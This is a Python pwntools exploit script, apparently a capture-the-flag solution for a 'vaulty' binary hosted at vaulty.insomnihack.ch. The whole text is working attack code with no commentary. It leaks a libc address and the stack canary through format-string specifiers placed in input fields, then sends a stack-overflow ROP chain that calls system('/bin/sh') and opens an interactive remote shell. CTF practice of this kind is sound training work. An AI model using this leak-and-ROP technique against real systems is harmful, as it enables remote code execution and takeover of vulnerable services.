#!/usr/bin/env python3

from pwn import *

exe = ELF("vaulty-f5d5d6e5471b625659733cff28ece1b876c7fc228b014ce1f1bad7aa768c3790")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

# p = process("./vaulty-f5d5d6e5471b625659733cff28ece1b876c7fc228b014ce1f1bad7aa768c3790")
# gdb.attach(p)

p = remote("vaulty.insomnihack.ch", 4556)

def choose(option):
    p.recvuntil(b"(1-5):")
    p.sendline(str(option).encode())

def create(user, pwd, url):
    choose(1)
    p.recvuntil(b"Username:")
    p.sendline(user)
    p.recvuntil(b"Password:")
    p.sendline(pwd)
    p.recvuntil(b"URL:")
    p.sendline(url)

def view(id):
    choose(4)
    p.recvuntil(b":")
    p.sendline(str(id).encode())

create(b"%161$p", b"%11$p", b"%162$p")
view(0)
p.recvuntil(b"Username: ")
libc_leak = int(p.recvline().strip(), 16)
p.recvuntil(b"Password: ")
canary = int(p.recvline().strip(), 16)

libc.address = libc_leak - 0x29e40
log.success(f"{hex(libc.address)=}")
log.success(f"{hex(canary)=}")

pop_rdi = libc.address + 0x2a3e5
ret = libc.address + 0x29139

payload = b"E" * 40
payload += p64(canary)
payload += b"F" * 24
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(next(libc.search(b"/bin/sh")))
payload += p64(libc.sym["system"])

create(b"A"*4, b"B"*4, payload)

p.interactive()